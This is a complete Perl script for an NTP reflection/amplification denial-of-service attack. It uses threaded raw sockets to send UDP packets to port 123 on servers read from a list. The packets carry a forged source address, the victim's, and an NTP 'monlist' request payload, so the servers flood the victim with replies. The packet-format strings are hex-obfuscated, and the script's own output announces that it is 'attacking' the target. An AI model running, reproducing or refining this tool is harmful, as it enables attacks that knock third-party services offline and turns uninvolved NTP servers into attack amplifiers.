use threads;
use Socket;

my $num_of_threads = $ARGV[5];
my $target = $ARGV[0];
my $udp_src_port = $ARGV[1];
my $time = $ARGV[2];
#Open Input List.
my $openme = $ARGV[3];
open my $handle, '<', $openme;
chomp(my @servers = <$handle>);
close $handle;
my $ppr = $ARGV[4];
my @threads = initThreads();
print "I guess im attacking $target for $time seconds with $num_of_threads threads\n";

#Does the list exist?
if (-e $openme) {
        print "Using $openme as list.\n";
}
unless (-e $openme) {
        print "List does not exist.\n";
exit();
}

#Start Threading
foreach(@threads){
                $_ = threads->create(\&attackshit);
}
foreach(@threads){
        $_->join();
}
sub initThreads{
        my @initThreads;
        for(my $i = 1;$i<=$num_of_threads;$i++){
                push(@initThreads,$i);
        }
        return @initThreads;
}


#Start DDosing.
sub attackshit{

alarm("$time");
repeat: my $ip_dst = ( gethostbyname( $servers[ int( rand(@servers) ) ] ) )[4];
my $ip_src = ( gethostbyname($target) )[4];
socket( RAW, AF_INET, SOCK_RAW, 255 ) or die $!;
setsockopt( RAW, 0, 1, 1 );
main();

sub main {
    my $packet;
    $packet = ip_header();
    $packet .= udp_header();
    $packet .= payload();
                #send_packet($packet) && goto repeat;
                #send_packet($packet)
for (1 .. $ppr) {
        send_packet($packet) or last;
        }
goto repeat;
}

sub ip_header {
    my $ip_ver  = 4;
    my $ip_header_len  = 5;
    my $ip_tos  = 0;
    my $ip_total_len   = $ip_header_len + 20;
    my $ip_frag_id  = 0;
    my $ip_frag_flag   = "\x30\x31\x30";
    my $ip_frag_offset = "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30";
    my $ip_ttl  = 255;
    my $ip_proto  = 17;
    my $ip_checksum    = 0;
    my $ip_header  = pack(
"\x48\x32\x20\x48\x32\x20\x6E\x20\x6E\x20\x42\x31\x36\x20\x68\x32\x20\x63\x20\x6E\x20\x61\x34\x20\x61\x34",
  $ip_ver . $ip_header_len,  $ip_tos,
  $ip_total_len,  $ip_frag_id,
  $ip_frag_flag . $ip_frag_offset, $ip_ttl,
  $ip_proto,  $ip_checksum,
  $ip_src,  $ip_dst
    );
    return $ip_header;
}

sub udp_header {
    my $udp_dst_port = 123;
    my $udp_len  = 8 + length( payload() );
    my $udp_checksum = 0;
    my $udp_header   = pack( "\x6E\x20\x6E\x20\x6E\x20\x6E",
  $udp_src_port, $udp_dst_port, $udp_len, $udp_checksum );
    return $udp_header;
}

sub payload {
    my $data = "\x17\x00\x03\x2a" . "\x00" x 4;
    my $payload = pack( "\x61" . length($data), $data );
    return $payload;
}

sub send_packet {
    send( RAW, $_[0], 0,
  pack( "\x53\x6E\x61\x34\x78\x38", AF_INET, 60, $ip_dst ) );
}

}
